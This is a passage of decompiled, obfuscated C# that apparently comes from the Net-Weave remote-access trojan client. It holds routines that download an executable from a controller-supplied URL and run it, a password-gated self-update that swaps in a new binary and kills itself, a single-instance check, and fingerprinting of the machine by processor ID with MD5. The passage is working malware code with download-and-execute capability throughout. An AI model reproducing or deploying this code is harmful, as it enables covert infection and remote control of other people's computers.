			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class14).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class14).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class14).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class14).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class3.string_10), bool_0: false)))
		{
			(array[2] as Class14).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class14).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class14).method_9("Updating");
			if (Class3.bool_0)
			{
				Class1.smethod_4();
			}
			(array[2] as Class14).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class14).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
